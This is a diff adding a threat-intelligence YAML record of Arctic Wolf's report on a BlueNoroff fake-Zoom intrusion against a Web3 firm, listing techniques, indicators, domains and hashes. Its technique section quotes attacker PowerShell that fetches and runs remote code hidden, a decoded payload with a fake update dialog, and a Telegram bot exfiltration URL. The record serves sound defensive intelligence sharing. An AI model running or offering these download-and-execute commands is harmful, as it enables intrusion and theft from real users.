@@ -1,0 +1,99 @@
+title: Arctic Wolf identifies targeted intrusion against North American Web3/cryptocurrency
+  company
+description: The report documents a full-lifecycle intrusion by BlueNoroffs fake conference
+  campaign against a North American Web3 company, progressing from spear-phishing/social
+  engineering, through to persistent access lasting over 66 days.
+attribution: BlueNoroff
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  command_lines:
+  - cmd set ZOOM_API_KEY="BOtlweWKewotkWQKEWODNXCSK" set ZOOM_API_SECRET="QYrYiRfRTYTPL7RVZ09yRths2MXZSQV7"
+    set ZOOM_SDK_UTILITY="normal" set ZOOM_SDK_LEVEL="High" set ZOOM_LANGUAGE="en-US"
+    setx audio_volume 100 pnputil /enum-devices /connected /class "Audio" start hxxps://developers[.]zoom[.]us/docs/meeting-sdk
+    <INJECTED POWERSHELL PAYLOAD> cls exit
+  - powershell -ep bypass -c "(iwr -Uri hxxps://uu03webzoom[.]us/developer/sdk/update/version/[REDACTED]
+    -UserAgent 'ZoomSDK' -UseBasicParsing).Content | iex"
+  powershell:
+  - '{[Text.Encoding]::UTF8.GetString([byte[]]([Convert]::FromBase64String($_)| ForEach-Object{[byte]($_
+    -bxor 0x43)}))}'
+  - '$5kd023ng="hxxps://uu03webzoom[.]us/developer/sdk/fix/2/version/Ivo55HpFm" #
+    Decoded payload actions (after Base64+XOR 0x43 decode): # 1. Download chromechip.log
+    $b9uf3o4y = $env:TEMP+''\chromechip.log'' Invoke-WebRequest -Uri $5kd023ng -UserAgent
+    "ZoomSDK" -OutFile "$b9uf3o4y" # 2. Execute in hidden window Start-Process powershell.exe
+    -ArgumentList "-ep Bypass -c `"Get-Content ''$($b9uf3o4y)'' | iex`"" -WindowStyle
+    Hidden # 3. Lure completion dialog [System.Windows.Forms.MessageBox]::Show("Zoom
+    was updated successfully.", "Zoom Update Complete", [System.Windows.Forms.MessageBoxButton]::OK,
+    [System.Windows.Forms.MessageBoxImage]::Information)'
+  - while ($true) { ... }
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  - '{[Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''{base64_string}''))
+    ^ 0x43)}'
+  scripts: []
+  registry_keys:
+  - Registry: ProxyEnable / ProxyServer
+  - HKCU\Microsoft\Windows\Start Menu\Programs\Startup\Chrome Update Certificated.lnk
+  image_loads:
+  - comBypassUacDLL.x64.dll
+  network_connections:
+  - powershell.exe -> hxxps://uu03webzoom[.]us/developer/sdk/update/version/[REDACTED]:80
+  - powershell.exe -> hxxps://uu03webzoom[.]us/developer/sdk/fix/2/version/Ivo55HpFm:80
+  - chromechip.log -> 83[.]136[.]208[.]246:6783
+  - powershell.exe -> 83.136.209.22:8444
+  - powershell.exe -> 83[.]136[.]208[.]246:443
+  - powershell.exe -> 83[.]136[.]209[.]22:443
+  - powershell.exe -> 104[.]145[.]210[.]107:443
+  - powershell.exe -> uu03webzoom[.]us:80
+  - powershell.exe -> check02id[.]com:80
+  - powershell.exe -> thriddata[.]com:80
+  file_activity:
+  - '%TEMP%\chromechip.log'
+  - '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Chrome Update Certificated.lnk'
+  - '%USERPROFILE%\chrome-debug-data001.log'
+  persistence:
+  - Startup LNK file (Chrome Update Certificated.lnk) in %APPDATA%\Microsoft\Windows\Start
+    Menu\Programs\Startup\
+  process_relations: []
+iocs:
+  hashes:
+  - edd0301ffb793169b1314c59c0ef3a98d5793c0441dd43a7c484d61deb4f107f
+  - dd1c72823f933952619cbb86aaeaea43057a259e9a0c9e3b11c82225ec3faaa1
+  ip_addresses:
+  - 83[.]136[.]208[.]246
+  - 83.136.208.246
+  - 83.136.209.22
+  - 104.145.210.107
+  - 188.227.197.32
+  - 23.254.226.83
+  - 83[.]136[.]209[.]22
+  - 104[.]145[.]210[.]107
+  domains:
+  - zoom[.]us
+  - teams[.]microsoft[.]com
+  - uu03webzoom[.]us
+  - developers[.]zoom[.]us
+  - uu03webzoom.us
+  - teams.livesmeet.us
+  - teams.livesmeets.us
+  - zoom.ue01web.us
+  - zoom.un01web.us
+  - pd.uc05web.us
+  - support.teams-live.org
+  - thriddata.com
+  - web01zoom.com
+  - www.curio.com
+  - check02id[.]com
+  - thriddata[.]com
+  urls:
+  - hxxps://uu03webzoom[.]us/developer/sdk/update/version/[REDACTED]
+  - hxxps://uu03webzoom[.]us/developer/sdk/fix/2/version/Ivo55HpFm
+  - hxxps://api.telegram.org/bot8446140951:AAExeAepUZQAegP0A9IQbp__JB4xDaq4ohc/sendPhoto
+authors:
+- Arctic Wolf
+- Huntress
+- Validin
+reference: https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/
+date_of_publication: April 27, 2026
+file_creation_date: May 01, 2026
